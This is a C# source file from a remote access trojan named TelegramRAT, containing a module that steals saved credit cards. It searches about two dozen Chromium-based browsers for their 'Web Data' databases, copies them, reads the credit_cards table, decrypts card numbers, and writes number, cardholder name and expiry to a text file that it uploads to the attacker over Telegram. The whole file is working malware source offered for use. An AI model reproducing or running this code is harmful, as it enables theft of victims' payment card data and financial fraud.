﻿using System;
using System.IO;

namespace TelegramRAT
{
    internal class CreditCards
    {

        public static void get()
        {
            // loadDlls
            AutoStealer.loadDlls();
            // Path info
            string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
            string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
            string u_s = "\\User Data\\Default\\Web data"; // Most what Modern-Browser's use.
            // Browsers list
            string[] chromiumBasedBrowsers = new string[]
            {
                l_a + "Google\\Chrome" + u_s,
                l_a + "Google(x86)\\Chrome" + u_s,
                l_a + "Chromium" + u_s,
                a_a + "Opera Software\\Opera Stable\\Web Data",
                l_a + "BraveSoftware\\Brave-Browser" + u_s,
                l_a + "Epic Privacy Browser" + u_s,
                l_a + "Amigo" + u_s,
                l_a + "Vivaldi" + u_s,
                l_a + "Orbitum" + u_s,
                l_a + "Mail.Ru\\Atom" + u_s,
                l_a + "Kometa" + u_s,
                l_a + "Comodo\\Dragon" + u_s,
                l_a + "Torch" + u_s,
                l_a + "Comodo" + u_s,
                l_a + "Slimjet" + u_s,
                l_a + "360Browser\\Browser" + u_s,
                l_a + "Maxthon3" + u_s,
                l_a + "K-Melon" + u_s,
                l_a + "Sputnik\\Sputnik" + u_s,
                l_a + "Nichrome" + u_s,
                l_a + "CocCoc\\Browser" + u_s,
                l_a + "uCozMedia\\Uran" + u_s,
                l_a + "Chromodo" + u_s,
                l_a + "Yandex\\YandexBrowser" + u_s
            };

            // Database
            string tempCCLocation = "";
            string filename = "credit_cards.txt";
            string output = "[CREDIT CARDS]\n\n";

            // Search all browsers
            foreach (string browser in chromiumBasedBrowsers)
            {
                if (File.Exists(browser))
                {
                    tempCCLocation = Environment.GetEnvironmentVariable("temp") + "\\browserCreditCards";
                    if (File.Exists(tempCCLocation))
                    {
                        File.Delete(tempCCLocation);
                    }
                    File.Copy(browser, tempCCLocation);
                } else {
                    continue;
                }

                // Read chrome database
                cSQLite sSQLite = new cSQLite(tempCCLocation);
                sSQLite.ReadTable("credit_cards");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    // Get data from database
                    string number = sSQLite.GetValue(i, 4);
                    string expYear = sSQLite.GetValue(i, 3);
                    string expMonth = sSQLite.GetValue(i, 2);
                    string name = sSQLite.GetValue(i, 1);

                    // If no data => break
                    if (string.IsNullOrEmpty(number))
                    {
                        break;
                    }

                    // Add
                    output += "NUMBER: " + Crypt.decryptChrome(number, browser) + "\n"
                           + "NAME: " + Crypt.toUTF8(name) + "\n"
                           + "EXPIRE_YEAR: " + expYear + "\n"
                           + "EXPIRE_MONTH: " + expMonth + "\n"
                           + "\n";
                    continue;
                }
                continue;
            }
            // Send
            File.WriteAllText(filename, output);
            telegram.UploadFile(filename, true);
        }
    }
}
